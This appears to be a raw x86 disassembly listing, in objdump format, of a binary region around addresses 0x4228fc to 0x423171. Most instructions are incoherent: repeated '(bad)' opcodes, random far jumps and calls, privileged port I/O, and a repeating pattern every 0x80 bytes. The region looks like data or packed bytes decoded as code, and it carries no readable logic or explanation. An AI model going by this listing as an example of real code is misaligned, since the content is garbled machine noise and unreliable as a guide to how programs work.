  4228fc:	or     edi,DWORD PTR [ebx+0x1f]
  4228ff:	outs   dx,DWORD PTR ds:[esi]
	...
  42290c:	add    BYTE PTR [eax],al
  42290e:	xchg   esp,eax
  42290f:	nop
  422910:	ffree  st(0)
  422912:	(bad)  
  422914:	popf   
  422915:	aam    0x57
  422917:	(bad)
  42291b:	lods   eax,DWORD PTR ds:[esi]
  42291c:	stc    
  42291d:	inc    ebx
  42291e:	iret   
  42291f:	rol    BYTE PTR [ecx],1
  422921:	add    BYTE PTR [edx+0x0],bl
  422924:	add    BYTE PTR [eax],al
  422926:	or     DWORD PTR [esp+ecx*2+0x4],edi
  42292a:	push   ds
  42292b:	push   ebx
  42292c:	into   
  42292d:	mov    ds:0x17a819e1,eax
  422932:	add    BYTE PTR [ebx-0xf],al
  422935:	push   ecx
  422936:	cmp    DWORD PTR [ecx+ecx*2-0x13],ecx
  42293a:	cmc    
  42293b:	fcomi  st,st(1)
  42293d:	jmp    0x4228f9
  42293f:	lahf   
  422940:	test   eax,0xfba65ec5
  422945:	push   0xfd5a6c1e
  42294a:	loope  0x4228f5
  42294c:	test   eax,0x97c24077
  422951:	xlat   BYTE PTR ds:[ebx]
  422952:	mov    esp,0xfa680f47
  422957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422958:	cwde   
  422959:	jp     0x42291a
  42295b:	cwde   
  42295c:	ss out 0x10,al
  42295f:	xor    esp,ecx
  422961:	cmp    al,dl
  422963:	test   BYTE PTR fs:0x65e2b296,bh
  42296a:	add    eax,0x8fdf80ca
  42296f:	xor    DWORD PTR [edx],ebp
  422971:	mov    esp,0x2f3cca5a
  422976:	fadd   st(4),st
  422978:	cwde   
  422979:	xchg   edx,eax
  42297a:	mov    cl,0xda
  42297c:	pop    ecx
  42297d:	mov    ah,0xff
  42297f:	jecxz  0x422981
	...
  42298d:	add    ah,dh
  42298f:	mov    dl,0x32
  422991:	(bad)  
  422992:	jbe    0x42296a
  422994:	hlt    
  422995:	mov    dl,0xb1
  422997:	and    al,0xfe
  422999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42299a:	sbb    DWORD PTR [ebp-0x4],esi
  42299d:	aam    0x29
  42299f:	rol    DWORD PTR [ecx],1
  4229a1:	add    BYTE PTR [edx+0x0],bl
  4229a4:	add    BYTE PTR [eax],al
  4229a6:	mov    WORD PTR [ebp-0x20],ss
  4229a9:	mov    ds:0xa4ad93d0,al
  4229ae:	cmp    al,0x3f
  4229b0:	enter  0x9118,0xf5
  4229b4:	push   esi
  4229b5:	dec    ecx
  4229b6:	adc    al,0x19
  4229b8:	popf   
  4229b9:	or     ebx,eax
  4229bb:	push   esi
  4229bc:	sbb    BYTE PTR [esi],bl
  4229be:	xchg   ebp,eax
  4229bf:	mov    edx,0x26b446a0
  4229c4:	push   ecx
  4229c5:	or     BYTE PTR [edx+edi*1],cl
  4229c8:	mov    ecx,0x53a1f6a7
  4229cd:	mov    eax,0x914847c9
  4229d2:	and    ebx,edi
  4229d4:	xor    esp,DWORD PTR [ebp+0xbb86251]
  4229da:	mov    ds:0x800f1d7a,eax
  4229df:	pop    eax
  4229e0:	xchg   edx,eax
  4229e1:	xchg   edi,eax
  4229e2:	and    al,0xa6
  4229e4:	mov    eax,0x1bd94223
  4229e9:	dec    ebx
  4229ea:	lahf   
  4229eb:	pop    ebx
  4229ec:	sbb    BYTE PTR [edx+0x1f5c5612],dh
  4229f2:	pop    eax
  4229f3:	lea    eax,[edi+0x6c9d80d8]
  4229f9:	retf   
  4229fa:	es in  al,dx
  4229fc:	ret    
  4229fd:	cwde   
  4229fe:	(bad)  
  4229ff:	out    0x0,al
	...
  422a0d:	add    BYTE PTR [edx],dh
  422a0f:	ror    esi,cl
  422a11:	mov    ds:0xd37ebfef,al
  422a16:	sub    edi,DWORD PTR [esi]
  422a18:	out    0x3f,eax
  422a1a:	mov    ebp,0x838cbcea
  422a1f:	rol    DWORD PTR [ecx],1
  422a21:	add    BYTE PTR [edx+0x0],bl
  422a24:	add    BYTE PTR [eax],al
  422a26:	mov    eax,ds:0xa6658e47
  422a2b:	js     0x422a1a
  422a2d:	jbe    0x422a18
  422a2f:	outs   dx,DWORD PTR ds:[esi]
  422a30:	mov    WORD PTR [edi-0x52d183cb],ds
  422a36:	cmp    dl,ah
  422a38:	(bad)
  422a3b:	out    0xe6,eax
  422a3d:	pop    ds
  422a3e:	sub    eax,0x6cda0885
  422a43:	add    al,0x40
  422a45:	sub    DWORD PTR [ecx+0x40fc808c],eax
  422a4b:	push   cs
  422a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a4d:	cmp    dl,BYTE PTR [eax-0x24788ad5]
  422a53:	(bad)  
  422a54:	aad    0x77
  422a56:	addr16 jbe 0x422a53
  422a59:	dec    eax
  422a5a:	sahf   
  422a5b:	in     eax,0x47
  422a5d:	jae    0x422a39
  422a5f:	ret    0x3136
  422a62:	mov    ah,BYTE PTR [ecx]
  422a64:	sub    ecx,DWORD PTR [ecx-0x4f49d971]
  422a6a:	add    DWORD PTR [eax+0x5b],edx
  422a6d:	add    ecx,DWORD PTR [eax+0x61]
  422a70:	add    BYTE PTR [ecx-0x6a8df1b],0x75
  422a77:	mov    edx,0x9d9eb708
  422a7c:	adc    ch,dl
  422a7e:	sbb    ch,ch
	...
  422a8c:	add    BYTE PTR [eax],al
  422a8e:	fucomi st,st(5)
  422a90:	outs   dx,BYTE PTR ds:[esi]
  422a91:	and    bh,BYTE PTR [esi-0x5d]
  422a94:	(bad)  
  422a96:	pop    esi
  422a97:	(bad)  
  422a98:	mov    DWORD PTR [ebp-0x51d72ecd],ecx
  422a9e:	fst    st(1)
  422aa0:	add    DWORD PTR [eax],eax
  422aa2:	pop    edx
  422aa3:	add    BYTE PTR [eax],al
  422aa5:	add    BYTE PTR [ebp+ebp*8+0x7ba15e84],al
  422aac:	dec    edx
  422aad:	cmp    al,0xff
  422aaf:	xor    DWORD PTR [edi-0x1a4c71af],ebx
  422ab5:	call   0xc26dc42
  422aba:	or     BYTE PTR [edi+0x457ade18],cl
  422ac0:	mov    al,ds:0x67ed60a7
  422ac5:	pop    eax
  422ac6:	add    ebx,DWORD PTR [ebx+ebp*1+0x79ea1b41]
  422acd:	jnp    0x422a74
  422acf:	sub    DWORD PTR [edx-0x72703062],edi
  422ad5:	jo     0x422a79
  422ad7:	(bad)  
  422ad9:	sbb    al,0x12
  422adb:	ror    edi,1
  422add:	mov    edx,0xa43ecc8b
  422ae2:	mov    ah,0xba
  422ae4:	jp     0x422b61
  422ae6:	xchg   edi,eax
  422ae7:	loopne 0x422abe
  422ae9:	nop
  422aea:	(bad)  
  422aeb:	pusha  
  422aec:	adc    BYTE PTR [edi],cl
  422aee:	lahf   
  422aef:	push   edx
  422af0:	dec    edi
  422af1:	and    al,0xd2
  422af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422af4:	jno    0x422b64
  422af6:	imul   ecx,edi,0xee264a99
  422afc:	mov    ebp,0x8c0eb9
	...
  422b0d:	add    BYTE PTR ds:0x6f976b22,al
  422b13:	(bad)  
  422b15:	mov    dl,0x66
  422b17:	and    BYTE PTR [esi-0x70310196],ah
  422b1d:	fidiv  DWORD PTR [edi]
  422b1f:	rol    BYTE PTR [ecx],cl
  422b21:	add    BYTE PTR [edx+0x0],bl
  422b24:	add    BYTE PTR [eax],al
  422b26:	je     0x422b7d
  422b28:	dec    edi
  422b29:	push   es
  422b2a:	stc    
  422b2b:	retf   
  422b2c:	and    eax,0x56f48ab6
  422b31:	jp     0x422ad6
  422b33:	imul   esi,DWORD PTR [edi+0x2b609ed],0xa59e197
  422b3d:	shl    ebx,0x18
  422b40:	push   es
  422b41:	cmc    
  422b42:	mov    WORD PTR [ebx+0x29],fs
  422b45:	test   bh,bh
  422b47:	pop    esi
  422b48:	and    esp,ebp
  422b4a:	into   
  422b4b:	add    BYTE PTR [esi+ebx*1+0x4534fdc7],dl
  422b52:	inc    edx
  422b53:	int    0xf6
  422b55:	nop
  422b56:	ins    DWORD PTR es:[edi],dx
  422b57:	popa   
  422b58:	cmp    esp,DWORD PTR [edi+esi*2+0x4ae70383]
  422b5f:	arpl   WORD PTR [edi+0xdf17efb],ax
  422b65:	dec    eax
  422b66:	push   edi
  422b67:	or     BYTE PTR [ebp-0x640e9c8d],bl
  422b6d:	jecxz  0x422bb6
  422b6f:	jno    0x422bed
  422b71:	imul   edi,esi,0x4c
  422b74:	das    
  422b75:	bound  edi,QWORD PTR [ebx+0x45]
  422b78:	fnstsw WORD PTR [edx+ebp*1+0x6a]
  422b7c:	sub    dl,BYTE PTR [ebx+eiz*2+0x96]
	...
  422b8b:	add    BYTE PTR [eax],al
  422b8d:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422b93:	stc    
  422b94:	call   esi
  422b96:	into   
  422b97:	inc    ebp
  422b98:	mov    bh,0x11
  422b9a:	mov    dh,0x48
  422b9c:	adc    eax,DWORD PTR [esi-0x6f]
  422b9f:	rol    BYTE PTR [ecx],cl
  422ba1:	add    BYTE PTR [edx+0x0],bl
  422ba4:	add    BYTE PTR [eax],al
  422ba6:	jmp    0xa6f75ddd
  422bab:	popf   
  422bac:	dec    DWORD PTR [eax]
  422bae:	push   eax
  422baf:	mov    eax,ebx
  422bb1:	jnp    0x422b34
  422bb3:	dec    esi
  422bb4:	(bad)  [ebx+0x63]
  422bb7:	dec    eax
  422bb8:	adc    eax,0x5db12c4b
  422bbd:	or     al,0x70
  422bbf:	iret   
  422bc0:	mov    BYTE PTR [edx],ah
  422bc2:	and    edx,DWORD PTR [edi+0x2f]
  422bc5:	mov    ebx,0x8cc8fb66
  422bca:	dec    esp
  422bcb:	loopne 0x422b59
  422bcd:	or     al,0xee
  422bcf:	mov    edi,?
  422bd1:	sub    cl,BYTE PTR [esi]
  422bd3:	jno    0x422bbb
  422bd5:	retf   0x53c4
  422bd8:	(bad)  
  422bd9:	jmp    0x422ba9
  422bdb:	call   0xb6c4:0x17df1985
  422be2:	mov    dl,0x5
  422be4:	push   esi
  422be5:	mov    ch,0x7
  422be7:	lea    esi,[esi]
  422be9:	mov    esi,0xc4c0a952
  422bee:	scas   al,BYTE PTR es:[edi]
  422bef:	push   ecx
  422bf0:	aas    
  422bf1:	jmp    0x9ae5:0xc0660512
  422bf8:	lods   al,BYTE PTR ds:[esi]
  422bf9:	cs push 0x5
  422bfc:	call   0xc9adde
	...
  422c0d:	add    dh,bl
  422c0f:	sub    DWORD PTR [eax-0x210c002e],ebx
  422c15:	sub    eax,0x4af35f6
  422c1a:	or     eax,0xeb3bb8a9
  422c1f:	rol    BYTE PTR [ecx],cl
  422c21:	add    BYTE PTR [edx+0x0],bl
  422c24:	add    BYTE PTR [eax],al
  422c26:	cs and al,0x49
  422c29:	push   ss
  422c2a:	ins    DWORD PTR es:[edi],dx
  422c2b:	stos   DWORD PTR es:[edi],eax
  422c2c:	push   ds
  422c2d:	inc    edi
  422c2e:	ja     0x422c8c
  422c30:	aad    0xd6
  422c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c33:	dec    edx
  422c34:	out    0x18,al
  422c36:	pop    es
  422c37:	add    ch,BYTE PTR [edx+0x490cb675]
  422c3d:	rol    BYTE PTR [edi+0x280eb497],0xe9
  422c44:	les    ebx,FWORD PTR [edi-0x77d132f9]
  422c4a:	dec    esp
  422c4b:	shl    DWORD PTR [edx+eax*4-0x7f3ad4fa],0x17
  422c53:	push   0x44
  422c55:	add    edx,DWORD PTR [ecx+0xd2dedec]
  422c5b:	inc    edx
  422c5c:	ret    0x3823
  422c5f:	cmc    
  422c60:	mov    ebp,DWORD PTR [eax+0x9]
  422c63:	pushf  
  422c64:	std    
  422c65:	lahf   
  422c66:	sbb    al,BYTE PTR [esi-0x3309c822]
  422c6c:	sar    DWORD PTR [ebx],1
  422c6e:	mov    cl,0x6d
  422c70:	jmp    0xb000:0xcb5d2aab
  422c77:	neg    DWORD PTR [ebp+0x39]
  422c7a:	jbe    0x422c05
  422c7c:	pop    eax
  422c7d:	xor    ebp,edi
  422c7f:	xor    BYTE PTR [eax],al
	...
  422c8d:	add    BYTE PTR [esi+0x3f],cl
  422c90:	int3   
  422c91:	sbb    eax,0x7fdffffd
  422c96:	out    dx,eax
  422c97:	loopne 0x422caf
  422c99:	lods   al,BYTE PTR ds:[esi]
  422c9a:	adc    al,0x35
  422c9c:	sub    al,0xc
  422c9e:	inc    ebp
  422c9f:	rol    DWORD PTR [ecx],cl
  422ca1:	add    BYTE PTR [edx+0x0],bl
  422ca4:	add    BYTE PTR [eax],al
  422ca6:	or     DWORD PTR [eax-0x77688bb5],0xffffffee
  422cad:	fld    TBYTE PTR [edx]
  422caf:	xlat   BYTE PTR ds:[ebx]
  422cb0:	cmp    al,0xc6
  422cb2:	mov    edx,DWORD PTR [esi]
  422cb4:	pop    esi
  422cb5:	dec    eax
  422cb6:	pop    esp
  422cb7:	mov    BYTE PTR [edi-0x714e4d30],bl
  422cbd:	dec    edi
  422cbe:	dec    edx
  422cbf:	test   DWORD PTR [ecx],ebp
  422cc1:	inc    DWORD PTR [edi+0x29d4deb4]
  422cc7:	js     0x422cbd
  422cc9:	arpl   WORD PTR [eax],dx
  422ccb:	jl     0x422c81
  422ccd:	aam    0x3c
  422ccf:	inc    ebx
  422cd0:	mov    BYTE PTR [ebp+0x2a35c5bc],dh
  422cd6:	jae    0x422c93
  422cd8:	adc    DWORD PTR [ebx],edi
  422cda:	push   ecx
  422cdb:	shr    DWORD PTR fs:[ecx+0x33],0x67
  422ce0:	ins    BYTE PTR es:[edi],dx
  422ce1:	ins    DWORD PTR es:[edi],dx
  422ce2:	dec    BYTE PTR [ebx]
  422ce4:	es xchg ecx,eax
  422ce6:	jecxz  0x422d01
  422ce8:	jb     0x422c86
  422cea:	sub    dh,0x41
  422ced:	add    eax,0x41ba160
  422cf2:	sub    BYTE PTR [edx],0x8c
  422cf5:	cli    
  422cf6:	and    ecx,eax
  422cf8:	int    0x95
  422cfa:	push   esp
  422cfb:	sub    eax,0xae2615df
	...
  422d0c:	add    BYTE PTR [eax],al
  422d0e:	push   ds
  422d0f:	test   eax,0x7ff735f6
  422d14:	fild   QWORD PTR [ebx-0x5f9ed871]
  422d1a:	and    ebp,DWORD PTR [edx+esi*4-0x56]
  422d1e:	lahf   
  422d1f:	rol    DWORD PTR [ecx],cl
  422d21:	add    BYTE PTR [edx+0x0],bl
  422d24:	add    BYTE PTR [eax],al
  422d26:	call   0xc15a:0x44cc0b09
  422d2d:	jp     0x422da1
  422d2f:	sbb    al,0xe3
  422d31:	pop    edx
  422d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d33:	outs   dx,DWORD PTR ds:[esi]
  422d34:	cwde   
  422d35:	mov    ecx,DWORD PTR [ebp+0x77]
  422d38:	jae    0x422cf3
  422d3a:	pop    esi
  422d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d3c:	dec    ebx
  422d3d:	adc    BYTE PTR [ebx+0x11],dl
  422d40:	lock loop 0x422d19
  422d43:	cmc    
  422d44:	push   ebx
  422d45:	rol    DWORD PTR [ecx+0x66],cl
  422d48:	pop    ecx
  422d49:	mov    dh,0xb2
  422d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d4c:	leave  
  422d4d:	mov    ch,cl
  422d4f:	(bad)  
  422d50:	jmp    0x64597c8a
  422d55:	sub    eax,0xce95578
  422d5a:	cmp    esi,DWORD PTR [eax+0x71]
  422d5d:	push   0xab04c3d0
  422d62:	add    bl,bl
  422d64:	sar    BYTE PTR [eax],0x4b
  422d67:	jo     0x422dd0
  422d69:	mov    ds,WORD PTR [esi]
  422d6b:	je     0xa021e624
  422d71:	and    BYTE PTR [eax+0x2c2ee688],dl
  422d77:	cwde   
  422d78:	sbb    eax,0xebd7cd15
  422d7d:	and    BYTE PTR [ecx+0x71],dl
	...
  422d8b:	add    BYTE PTR [eax],al
  422d8d:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  422d93:	lods   eax,DWORD PTR ds:[esi]
  422d94:	fcomi  st,st(7)
  422d96:	sar    BYTE PTR [ebx],cl
  422d98:	(bad)  
  422d99:	add    ah,cl
  422d9b:	shl    DWORD PTR [ebx-0x4],0xf9
  422d9f:	rol    DWORD PTR [ecx],cl
  422da1:	add    BYTE PTR [edx+0x0],bl
  422da4:	add    BYTE PTR [eax],al
  422da6:	xor    dl,BYTE PTR [ecx-0x65e5c79d]
  422dac:	lahf   
  422dad:	in     al,dx
  422dae:	or     BYTE PTR [esi+0x2a029640],al
  422db4:	scas   al,BYTE PTR es:[edi]
  422db5:	mov    bh,0x70
  422db7:	out    dx,al
  422db8:	pop    edi
  422db9:	xchg   ebp,eax
  422dba:	xlat   BYTE PTR ds:[ebx]
  422dbb:	and    DWORD PTR [ebp+0x76],0xffffffcc
  422dbf:	adc    eax,DWORD PTR [edi-0x74938448]
  422dc5:	and    al,0x27
  422dc7:	in     eax,0x92
  422dc9:	or     edi,DWORD PTR ds:0x32e43fe2
  422dcf:	popf   
  422dd0:	xor    eax,0x58ade012
  422dd5:	xchg   ebx,eax
  422dd6:	push   ecx
  422dd7:	pop    esi
  422dd8:	das    
  422dd9:	mov    DWORD PTR [edi-0x2d5d7ce3],ebp
  422ddf:	xor    al,bh
  422de1:	push   cs
  422de2:	arpl   WORD PTR [ebp+0x6f],sp
  422de5:	adc    al,bl
  422de7:	mov    WORD PTR [edi-0x1a],?
  422dea:	shl    BYTE PTR [ebp-0x3a],0x40
  422dee:	sbb    eax,0x285a2fee
  422df3:	pop    esi
  422df4:	icebp  
  422df5:	inc    ecx
  422df6:	out    0x86,eax
  422df8:	adc    dl,BYTE PTR [ebp+ebp*2-0x590a9962]
  422dff:	sti    
	...
  422e0c:	add    BYTE PTR [eax],al
  422e0e:	or     bh,dh
  422e10:	ja     0x422e5c
  422e12:	dec    edx
  422e14:	cmp    eax,0x2e8eedf7
  422e19:	dec    eax
  422e1a:	fdivr  DWORD PTR [edx+0x34]
  422e1d:	retf   0xd453
  422e20:	add    DWORD PTR [eax],eax
  422e22:	pop    edx
  422e23:	add    BYTE PTR [eax],al
  422e25:	add    BYTE PTR [esi-0x42],dl
  422e28:	les    ecx,FWORD PTR [esi-0xb5cfc24]
  422e2e:	add    al,0xe7
  422e30:	out    dx,al
  422e31:	or     DWORD PTR [ebx-0x4c],0x3725fe9
  422e38:	add    edi,esp
  422e3a:	call   0x70f6:0xe88f0112
  422e41:	ror    DWORD PTR [esi+0x23ac724a],cl
  422e47:	adc    BYTE PTR [edx-0x5719ab5e],bl
  422e4d:	iret   
  422e4e:	(bad)  
  422e4f:	jo     0x422ed0
  422e51:	jmp    0x422eb5
  422e53:	jmp    0xf994:0x999890d1
  422e5a:	fldenv [eax-0x7b7b0cc0]
  422e60:	sbb    ebp,DWORD PTR [ebx]
  422e62:	mov    al,BYTE PTR [ebx-0x668dad57]
  422e68:	mov    esi,DWORD PTR [eax-0x36]
  422e6b:	int    0x77
  422e6d:	ins    BYTE PTR es:[edi],dx
  422e6e:	gs xchg esi,eax
  422e71:	cmp    esp,DWORD PTR [edx]
  422e73:	or     DWORD PTR [edx+0x6cc2c2b9],ebp
  422e79:	dec    ebp
  422e7a:	in     eax,0xf3
  422e7c:	lock jmp 0x422eee
  422e7f:	add    eax,DWORD PTR [eax]
	...
  422e8d:	add    BYTE PTR [esi],dh
  422e8f:	arpl   WORD PTR [eax-0x10],bp
  422e92:	jge    0x422e8f
  422e94:	mov    esi,0x8c7853e7
  422e99:	daa    
  422e9a:	xchg   esp,eax
  422e9b:	xor    al,0x5c
  422e9d:	scas   eax,DWORD PTR es:[edi]
  422e9e:	lods   eax,DWORD PTR ds:[esi]
  422e9f:	aam    0x1
  422ea1:	add    BYTE PTR [edx+0x0],bl
  422ea4:	add    BYTE PTR [eax],al
  422ea6:	(bad)  
  422ea7:	xchg   esi,eax
  422ea8:	inc    eax
  422ea9:	mov    ecx,0x865eb011
  422eae:	sub    eax,0xff09264
  422eb3:	sbb    ebp,DWORD PTR [eax]
  422eb5:	inc    edi
  422eb6:	pop    esp
  422eb7:	das    
  422eb8:	and    esi,ecx
  422eba:	cmp    DWORD PTR [ebp-0x7e],0xba2dd8c1
  422ec1:	inc    edi
  422ec2:	sub    eax,0xb4717b32
  422ec7:	push   edx
  422ec8:	popf   
  422ec9:	jo     0x422ea1
  422ecb:	jg     0x422ef8
  422ecd:	fwait
  422ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ecf:	sub    DWORD PTR [ebx-0x613270db],ebp
  422ed5:	enter  0xbb38,0x7d
  422ed9:	in     eax,0x5e
  422edb:	push   edx
  422edc:	fisubr WORD PTR [eax]
  422ede:	xchg   edi,eax
  422edf:	push   0xa5631492
  422ee4:	jb     0x422f42
  422ee6:	xchg   edi,eax
  422ee7:	mov    edi,0x4cb455f5
  422eec:	ins    BYTE PTR es:[edi],dx
  422eed:	mov    esi,0xefdf7349
  422ef2:	jge    0x422f5b
  422ef4:	xchg   edx,eax
  422ef5:	pop    esi
  422ef6:	ins    BYTE PTR es:[edi],dx
  422ef7:	sbb    eax,0x668f0415
  422efc:	pop    ss
  422efd:	fld    TBYTE PTR [edi-0x38]
	...
  422f0c:	add    BYTE PTR [eax],al
  422f0e:	daa    
  422f0f:	ss lahf 
  422f11:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f17:	and    eax,0x3e3b075b
  422f1c:	ret    
  422f1d:	jno    0x422ed4
  422f1f:	fild   DWORD PTR [ecx]
  422f21:	add    BYTE PTR [edx+0x0],bl
  422f24:	add    BYTE PTR [eax],al
  422f26:	ss test eax,0x58d6980e
  422f2c:	cmp    ah,BYTE PTR [esi+0x641a6444]
  422f32:	icebp  
  422f33:	shl    BYTE PTR [edx],0x20
  422f36:	iret   
  422f37:	movsx  esi,BYTE PTR [eax]
  422f3a:	sub    al,0x22
  422f3c:	push   0x4
  422f3e:	dec    ebp
  422f3f:	lock out dx,al
  422f41:	sbb    bl,dl
  422f43:	xchg   ebx,eax
  422f44:	scas   eax,DWORD PTR es:[edi]
  422f45:	test   eax,0x2bf62b60
  422f4a:	pop    edx
  422f4b:	leave  
  422f4c:	jbe    0x422eed
  422f4e:	leave  
  422f4f:	mov    ecx,0xf94d9d55
  422f54:	jmp    0xa00b3794
  422f59:	hlt    
  422f5a:	mov    ds:0xea8e9b0d,al
  422f5f:	ins    BYTE PTR es:[edi],dx
  422f60:	cmp    bh,BYTE PTR [ecx]
  422f62:	fld    TBYTE PTR [ebp-0x60]
  422f65:	mov    eax,ds:0x97d07085
  422f6a:	xchg   edx,ebp
  422f6c:	les    esi,FWORD PTR [edi]
  422f6e:	test   edx,esp
  422f70:	loop   0x422f4e
  422f72:	icebp  
  422f73:	mov    al,ds:0x8f52d0d1
  422f78:	and    eax,0x5ec7d020
  422f7d:	(bad)  
  422f7e:	xchg   BYTE PTR [eax+eax*1+0x0],dl
	...
  422f8e:	aaa    
  422f8f:	(bad)  
  422f90:	out    0xc2,eax
  422f92:	mul    ebx
  422f94:	aaa    
  422f95:	cmc    
  422f96:	xchg   ecx,eax
  422f97:	call   0x8278:0xdf57eef4
  422f9e:	paddusb mm0,QWORD PTR [ecx]
  422fa1:	add    BYTE PTR [edx+0x0],bl
  422fa4:	add    BYTE PTR [eax],al
  422fa6:	add    eax,0xd0855a41
  422fab:	ins    DWORD PTR es:[edi],dx
  422fac:	mov    ah,0x1e
  422fae:	xchg   DWORD PTR [eax-0x28725684],esi
  422fb4:	jns    0x423010
  422fb6:	sub    esp,esp
  422fb8:	int    0xc8
  422fba:	add    dl,BYTE PTR [eax]
  422fbc:	ret    0x23c3
  422fbf:	push   edi
  422fc0:	cmp    bl,dh
  422fc2:	push   edi
  422fc3:	mov    dh,BYTE PTR ds:0x82e2a4f2
  422fc9:	bound  ebx,QWORD PTR [esi-0x2a]
  422fcc:	jnp    0x422fc8
  422fce:	mov    ds:0x1b5027e5,al
  422fd3:	(bad)
  422fd6:	mov    ebx,0x657502f5
  422fdb:	gs jge 0x422fbb
  422fde:	adc    eax,0x14d20b2
  422fe3:	xchg   edi,eax
  422fe4:	stos   DWORD PTR es:[edi],eax
  422fe5:	leave  
  422fe6:	fild   QWORD PTR [esi]
  422fe8:	dec    edx
  422fe9:	mov    bl,0xe5
  422feb:	xor    DWORD PTR [ebp+0x6c108b29],0x4212dcdb
  422ff5:	mov    edx,0xd6b6eece
  422ffa:	in     al,dx
  422ffb:	mov    edx,0xcb93b2
	...
  42300d:	add    BYTE PTR [esi],dl
  42300f:	aad    0xdf
  423011:	out    dx,eax
  423012:	fucomip st,st(7)
  423014:	ss std 
  423016:	cmp    BYTE PTR [esi+0x61ae5f3a],al
  42301c:	daa    
  42301d:	add    al,0x69
  42301f:	fadd   QWORD PTR [ecx]
  423021:	add    BYTE PTR [edx+0x0],bl
  423024:	add    BYTE PTR [eax],al
  423026:	test   al,0x82
  423028:	cs in  eax,dx
  42302a:	dec    ebp
  42302b:	dec    DWORD PTR [ecx+0x2c7f21fc]
  423031:	jle    0x423066
  423033:	loop   0x423071
  423035:	stos   DWORD PTR es:[edi],eax
  423036:	dec    ebp
  423037:	outs   dx,BYTE PTR ss:[esi]
  423039:	push   ecx
  42303a:	data16 shl BYTE PTR [edx+eax*1],1
  42303e:	dec    ecx
  42303f:	outs   dx,BYTE PTR ds:[esi]
  423040:	adc    al,0xa3
  423042:	push   esi
  423043:	pop    es
  423044:	dec    ecx
  423045:	lds    esi,FWORD PTR [ebx-0x68194fc6]
  42304b:	sbb    bh,dh
  42304d:	cld    
  42304e:	inc    ebp
  42304f:	mov    ebx,0xc84610b6
  423054:	or     al,0x65
  423056:	push   edi
  423057:	test   dh,0x24
  42305a:	mov    bh,0xa2
  42305c:	cmc    
  42305d:	mov    cl,0x78
  42305f:	mov    edi,DWORD PTR [edx+edx*2-0x335bee3a]
  423066:	jp     0x423068
  423068:	clc    
  423069:	inc    ebp
  42306a:	cwde   
  42306b:	add    al,0xf9
  42306d:	cdq    
  42306e:	sub    al,0x89
  423070:	or     ecx,DWORD PTR [eax-0x2a]
  423073:	add    eax,0x86268b52
  423078:	xor    dh,dh
  42307a:	dec    ecx
  42307b:	scas   eax,DWORD PTR es:[edi]
  42307c:	jns    0x42d116
	...
  42308e:	outs   dx,BYTE PTR ds:[esi]
  42308f:	jbe    0x423075
  423091:	retf   0xdafc
  423094:	outs   dx,BYTE PTR ds:[esi]
  423095:	neg    BYTE PTR [eax]
  423097:	xchg   edx,eax
  423098:	xchg   DWORD PTR [edi-0x62e4b265],edx
  42309e:	ret    
  42309f:	fadd   QWORD PTR [ecx]
  4230a1:	add    BYTE PTR [edx+0x0],bl
  4230a4:	add    BYTE PTR [eax],al
  4230a6:	xchg   BYTE PTR [ebx],bl
  4230a8:	adc    esi,DWORD PTR [ebp-0x1c]
  4230ab:	cdq    
  4230ac:	push   ebx
  4230ad:	aad    0x9e
  4230af:	ficomp WORD PTR [ecx]
  4230b1:	lods   al,BYTE PTR ds:[esi]
  4230b2:	repz mov esp,0x5cca92f
  4230b8:	jecxz  0x4230ce
  4230ba:	sub    esp,DWORD PTR [ebp-0x53]
  4230bd:	jnp    0x423091
  4230bf:	int3   
  4230c0:	jns    0x4230ee
  4230c2:	ret    0x6e61
  4230c5:	mov    edx,0x76475de
  4230ca:	sub    eax,0x7eaec8b2
  4230cf:	scas   eax,DWORD PTR es:[edi]
  4230d0:	imul   ebp,DWORD PTR [edx-0x5],0xffffffa7
  4230d4:	xchg   DWORD PTR [eax+0x73],edi
  4230d7:	repnz sar ebx,0x23
  4230db:	shr    BYTE PTR [ebp-0xf530446],1
  4230e1:	jnp    0x4230b9
  4230e3:	(bad)  
  4230e4:	jo     0x423157
  4230e6:	in     al,dx
  4230e7:	rol    DWORD PTR [esi],0x18
  4230ea:	adc    BYTE PTR [ecx+0x13],ah
  4230ed:	sbb    BYTE PTR [edi],0xfd
  4230f0:	and    eax,0xbb2f8d19
  4230f5:	push   ss
  4230f6:	mov    dl,0x22
  4230f8:	rcr    ebx,0x90
  4230fb:	mov    bl,0xb
  4230fd:	js     0x423120
  4230ff:	lods   eax,DWORD PTR ds:[esi]
	...
  42310c:	add    BYTE PTR [eax],al
  42310e:	cmp    dl,BYTE PTR [edx-0x3c]
  423111:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  423118:	nop
  423119:	ror    DWORD PTR [ecx+0x3b],cl
  42311c:	std    
  42311d:	add    al,0x1d
  42311f:	fld    QWORD PTR [ecx]
  423121:	add    BYTE PTR [edx+0x0],bl
  423124:	add    BYTE PTR [eax],al
  423126:	mov    ds:0xa0e0a96f,eax
  42312b:	bound  ebx,QWORD PTR [eax+eiz*1+0x76f682eb]
  423132:	retf   
  423133:	stc    
  423134:	inc    esi
  423135:	sbb    dh,0xfe
  423138:	jl     0x42313e
  42313a:	mov    cl,0x10
  42313c:	mov    edi,0xe346ddc1
  423141:	sbb    eax,0x98d9ffb
  423146:	xor    DWORD PTR [edi],ebx
  423148:	cld    
  423149:	jl     0x4230dd
  42314b:	fwait
  42314c:	(bad)  
  42314d:	sbb    eax,0xbf242916
  423152:	add    al,0x7a
  423154:	jl     0x423142
  423156:	or     eax,0xeb152635
  42315b:	jnp    0x423170
  42315d:	cmp    ebp,DWORD PTR [eax+0x59]
  423160:	fnstenv [edi+edx*1-0x220b82ca]
  423167:	jl     0x4231a1
  423169:	pop    eax
  42316a:	pusha  
  42316b:	nop
  42316c:	loope  0x42314d
  42316e:	and    DWORD PTR [eax-0x5a],esp
  423171:	cmp    BYTE PTR [edx+0x3229bcce],0xd6
